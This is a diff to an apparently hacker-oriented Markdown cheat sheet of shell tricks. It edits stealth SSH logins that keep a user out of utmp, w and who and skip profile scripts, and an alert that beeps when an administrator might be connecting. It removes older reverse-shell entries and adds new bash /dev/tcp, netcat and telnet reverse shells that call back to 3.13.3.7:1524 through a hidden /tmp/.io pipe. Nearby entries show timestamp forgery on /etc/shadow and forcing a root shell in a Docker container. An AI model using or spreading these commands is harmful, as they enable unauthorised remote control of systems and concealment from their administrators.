@@ -26,7 +26,7 @@ $ kill -9 $$
 ```
 $ ssh -o UserKnownHostsFile=/dev/null -T user@host.org "bash -i"
 ```
-This will not add your user to the */var/log/utmp* file and you wont show up in *w* or *who* command of logged in users. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.
+This will not add your user to the */var/log/utmp* file and you wont show up in *w* or *who* command of logged in users. It will bypass .profile and .bash_profile as well. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.
 
 **3. SSH tunnel OUT**
 
@@ -247,13 +247,13 @@ $ touch -r /etc/shadow /etc/passwd
 
 **19. Alert on new TCP connections**
 
-Make a noise (BING) when anyone tries to SSH into our system (could be an admin!).
+Make a *bing*-noise (ascii BEL) when anyone tries to SSH to/from our system (could be an admin!).
 
 ```
 # tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
 ```
 
-**20. Generate quick random hex**
+**20. Generate quick random Password**
 
 Good for quick passwords without human element.
 
@@ -261,54 +261,7 @@ Good for quick passwords without human element.
 $ openssl rand -base64 24
 ```
 
-**21. Reverse shell with nc**
-
-First listen for a shell on your server.
-
-```
-$ nc -lvp 666
-```
-
-Reverse connect with netcat.
-
-```
-$ nc -e /bin/sh yourserver.com 666
-```
-
-Reverse connect with netcat built without `-e` flag.
-
-```
-$ mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2>&1|nc yourserver.com 666 >/tmp/x
-```
-
-**22. Reverse shell with bash**
-
-Replace `xx.xx.xx.xx` with your server ip.
-
-```
-$ bash -i >& /dev/tcp/xx.xx.xx.xx/666 0>&1
-```
-
-**23. SSH with different shell**
-
-Bypass events that exist in login scripts such as `.profile` and `.bashrc`.
-
-```
-$ ssh user@server sh
-
-```
-
-**24. Strip SSH key comment field.**
-
-`ssh-keygen` automatically fills this field with local user and host, and can be recorded during connection.
-
-Command strips comment field from both private and public keys.
-
-```
-$ ssh-keygen -c -C "redacted" -f ~/.ssh/id_rsa
-```
-
-**25. Get a root shell in Docker container.**
+**21. Get a root shell in Docker container.**
 
 If the container is already running:
 
@@ -322,7 +275,7 @@ If the container is not running:
 $ docker run -it --user root --entrypoint /bin/bash <container>
 ```
 
-**26. Linux transportable encrypted filesystems.**
+**22. Linux transportable encrypted filesystems.**
 
 Like truecrypt but better.  You may need to `losetup -f` to get a loop device.
 
@@ -350,6 +303,33 @@ Store data in `/mnt/crypted`, then unmount:
 # losetup -d /dev/loop0
 ```
 
+**23. Bash reverse shell**
+
+Start netcat to listen on port 1524 on your system:
+```
+$ nc -nvlp 1524
+```
+
+On the remote system. This Bash will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
+```
+$ bash -i 2>&1 >& /dev/tcp/3.13.3.7/1524 0>&1
+```
+
+**24. Reverse Shell without Bash**
+
+Especially embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
+
+On the remote system:
+```
+$ mkfifo /tmp/.io
+$ sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
+```
+
+Telnet variant:
+```
+$ mkfifo /tmp/.io
+$ sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
+```
 
 
 --------------------------------------------------------------------------
